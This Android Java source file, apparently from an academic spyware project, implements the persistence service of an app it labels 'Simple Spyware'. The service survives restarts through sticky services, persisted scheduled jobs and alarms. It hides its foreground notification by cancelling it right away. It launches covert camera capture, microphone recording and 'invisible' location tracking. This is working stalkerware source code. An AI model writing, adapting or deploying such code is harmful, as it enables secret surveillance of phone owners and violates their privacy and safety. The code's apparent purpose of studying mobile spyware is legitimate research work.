package ch.zhaw.init.orwell_a.persistence;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.job.JobInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.os.PersistableBundle;
import android.util.Log;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import ch.zhaw.init.orwell_a.R;
import ch.zhaw.init.orwell_a.common.AppPreferences;
import ch.zhaw.init.orwell_a.data.audio.MicrophoneService;

public class PersistenceService extends Service {
    private static final String TAG = PersistenceService.class.getCanonicalName();
    private static AlarmReceiver alarm = new AlarmReceiver();
    public static final int JOB_ID = 1337;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(@NonNull Intent intent, int flags, int startId)
    {
        startForeground();
        if(intent != null){
            if(intent.getAction() != null && intent.getAction().equals("StartSpyAlarm")){
                Log.i(TAG, "StartSpyAlarm");
                alarm.cancelAlarm(this, intent);
                alarm.setAlarm(this, intent);
                Toast.makeText(getApplicationContext(), "Alarm set", Toast.LENGTH_SHORT).show();
            }else if(intent.getAction() != null && intent.getAction().equals("StartSpyJob")){
                Log.i(TAG, "StartSpyJob");
                scheduleJob(intent);
                Toast.makeText(getApplicationContext(), "Job set", Toast.LENGTH_LONG).show();
            }
            else if(intent.getAction() != null && intent.getAction().equals("StopSpy")){
                Log.i(TAG, "StopSpy");
                stopAllJobs();
                alarm.cancelAlarm(this, intent);
                Toast.makeText(getApplicationContext(), "Stop Spy now!", Toast.LENGTH_SHORT).show();
            }
        }
        stopForeground(true);
        return START_STICKY;
    }

    private void startForeground(){
        NotificationChannel channel = new NotificationChannel("1", "Simple Spyware",
                NotificationManager.IMPORTANCE_LOW);
        channel.setDescription("PollingService");
        NotificationManager notificationManager = getSystemService(NotificationManager.class);
        notificationManager.createNotificationChannel(channel);
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "1")
                .setSmallIcon(R.drawable.ic_remove_red_eye_black_24dp)
                .setContentTitle("Simple Spyware")
                .setContentText("Spy is running!")
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setAutoCancel(true)
                .setOnlyAlertOnce(true)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET);
        Notification notification = builder.build();
        this.startForeground(1, notification);
        notificationManager.cancelAll();
    }

    /**
     * Schedule a new job.
     */
    public void scheduleJob(Intent intent){
        long interval = intent.getLongExtra("interval", 1000 * 2L);
        Log.e(TAG, "Schedule Job Interval Testing: " + interval);
        PersistableBundle extras = new PersistableBundle();
        extras.putLong("interval", interval);

        ComponentName serviceComponent = new ComponentName(this, CustomJobScheduler.class);
        JobInfo.Builder builder = new JobInfo.Builder(JOB_ID, serviceComponent);
        builder.setOverrideDeadline(interval * 2);
        builder.setMinimumLatency(interval); // Don't use periodic so we can schedule under 15min.
        builder.setPersisted(true);
        builder.setExtras(extras);

        android.app.job.JobScheduler jobScheduler = this.getSystemService(android.app.job.JobScheduler.class);
        if (jobScheduler != null) {
            jobScheduler.schedule(builder.build());
        }else{
            Log.e(TAG, "CustomJobScheduler could't start");
        }
    }

    private void stopAllJobs(){
        android.app.job.JobScheduler jobScheduler = this.getSystemService(android.app.job.JobScheduler.class);
        if (jobScheduler != null) {
            for(JobInfo jbInfo: jobScheduler.getAllPendingJobs()){
                jobScheduler.cancel(jbInfo.getId());
            }
            stopMicrophoneService(this);
        }
    }

    public static void stopMicrophoneService(Context ctx){
        Intent intent = new Intent("StopAudioCapturing");
        intent.setPackage(ctx.getPackageName());
        ctx.startForegroundService(intent);
    }

    public static void startDataServices(Context ctx){
        SharedPreferences sharedPreferences = ctx.getSharedPreferences(AppPreferences.getPreferencesName(), MODE_PRIVATE);
        boolean spyOnCamera = sharedPreferences.getBoolean(AppPreferences.getPreferenceCamera(), false);
        boolean spyOnMicrophone = sharedPreferences.getBoolean(AppPreferences.getPreferencesMicrophone(), false);
        boolean spyOnLocation = sharedPreferences.getBoolean(AppPreferences.getPreferencesLocation(), false);
        Intent intent = null;

        // Could be cleaner code...I know
        try{
            if(spyOnCamera){
                intent = new Intent("CamFrontBackShot");
                intent.setPackage(ctx.getPackageName());
                ctx.startForegroundService(intent);
            }
        }catch (Exception e){
            Log.e(TAG, "Error starting Cam-Service: " + e.getMessage());
        }
        try{
            if(spyOnMicrophone && !MicrophoneService.isIsRecording()){
                intent = new Intent("StartAudioCapturing");
                intent.setPackage(ctx.getPackageName());
                ctx.startForegroundService(intent);
            }
        }catch (Exception e){
            Log.e(TAG, "Error starting Mic-Service: " + e.getMessage());
        }
        try{
            if(spyOnLocation){
                intent = new Intent("StartInvisibleTracking");
                intent.setPackage(ctx.getPackageName());
                ctx.startForegroundService(intent);
            }
        }catch (Exception e){
            Log.e(TAG, "Error starting Loc-Service: " + e.getMessage());
        }
    }
}
